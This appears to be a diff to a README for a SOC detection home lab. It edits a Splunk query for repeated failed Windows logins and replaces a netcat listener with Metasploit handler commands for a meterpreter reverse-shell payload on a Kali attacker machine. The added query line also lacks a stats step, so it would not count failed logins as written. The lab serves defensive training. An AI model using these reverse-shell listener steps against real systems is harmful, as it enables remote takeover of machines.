@@ -61,7 +61,7 @@ index=* EventCode=4625
 Review and triage the authentication alerts generated from steps 1 and 2.
 
 - Correlate `4720` (account creation) with `4625` (failed logins) to identify suspicious sequences
-- Would be great to build a simple alert rule for accounts with >5 failed logins within a short window
+- Build an alert rule triggering on accounts with 5+ failed logins within 15 minutes
 
 <p>
   <img src="soc-detection-lab/failed_login_detection.png" width="700"/>
@@ -69,6 +69,7 @@ Review and triage the authentication alerts generated from steps 1 and 2.
 
 ```spl
 index=* EventCode=4625 earliest=-15m
+| where count >= 5
 ```
 
 ---
@@ -110,7 +111,12 @@ The payload is executed on the Windows victim machine, establishing a reverse sh
 On Kali — set up the listener first:
 
 ```bash
-nc -lvnp 4444
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST <KALI_IP>
+set LPORT 4444
+exploit
 ```
 
 On the victim (PowerShell or CMD):
